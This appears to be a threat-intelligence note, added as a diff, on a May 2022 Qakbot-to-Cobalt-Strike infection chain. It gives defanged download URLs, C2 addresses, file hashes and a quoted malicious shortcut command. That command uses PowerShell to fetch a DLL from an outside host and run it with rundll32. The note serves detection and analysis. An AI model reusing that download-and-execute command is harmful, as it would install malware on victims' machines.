@@ -1,0 +1,57 @@
+2022-05-17 (TUESDAY) - AA DISTRIBUTION QAKBOT (QBOT) LEADS TO COBALT STRIKE
+
+REFERENCE:
+
+- https://twitter.com/Unit42_Intel/status/1526664874180456452
+
+INFECTION CHAIN:
+
+- email --> link --> downloaded zip --> extracted shortcut --> Qakbot DLL --> Qakbot C2 --> Cobalt Strike activity
+
+TRAFFIC TO DOWNLOAD MALICIOUS ZIP ARCHIVE:
+
+- port 80 - http://meumundocatolico[.]com[.]br/pla/xmmuite
+- port 80 - http://meumundocatolico[.]com[.]br/pla/U1810259023.zip
+
+URL HOSTING QAKBOT DLL:
+
+- port 443 hxxps://smartleasesonora[.]com/yVuL6RYk/EW.png
+
+QAKBOT C2 TRAFFIC:
+
+- 38.70.253[.]226 port 2222 - HTTPS traffic
+
+COBALT STRIKE TRAFFIC:
+
+- 23.106.215[.]197 port 443 - rizucem[.]com - HTTPS traffic
+- 193.29.13[.]216 port 443 - svfin[.]icu - HTTPS traffic 
+
+NOTES:
+
+- In April 2022, svfin[.]icu resolved to 193.29.13[.]216 and was reported publicly as Cobalt Strike.
+
+- In today's HTTPS traffic, svfin[.]icu is an at-commonName value in certificate issuer data for the associated HTTPS traffic.
+
+MALWARE RETRIEVED FROM AN INFECTED WINDOWS HOST:
+
+- SHA256 hash: f9272801e9f70757819b7d49ebd1b09ec846c1119026aacf5e1ea7f7a77e9125
+- File size: 864 bytes
+- File name: U1810259023.zip
+- File location: hxxp://meumundocatolico[.]com[.]br/pla/U1810259023.zip
+- File description: zip archive retrieved from link in email
+
+- SHA256 hash: 31aff7c4ab72817fc99d95cdde8fb48ff743a92b717a13835ce6410d126a7e0e
+- File size: 2,013 bytes
+- File name: Z81310.lnk
+- File description: Windows shortcut contained in above zip archive
+- Shortcut: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+  hxxps://smartleasesonora[.]com/yVuL6RYk/EW.png -OutFile $env:TEMP\z222.dll;Start-Process
+  rundll32 $env:TEMP\z222.dll,DllInstall
+
+- SHA256 hash: 8a383f890745370e6f256396858a94062600f1efd2d1df36ef8a291e41494277
+- File size: 1,841,599 bytes
+- File location: hxxps://smartleasesonora[.]com/yVuL6RYk/EW.png
+- File location: C:\Users\[username]\AppData\Local\Temp\z222.dll
+- File type: PE32 executable (DLL) (GUI) Intel 80386, for MS Windows
+- File description: DLL file for Qakbot
+- Run method: rundll32 [filename],DllInstall
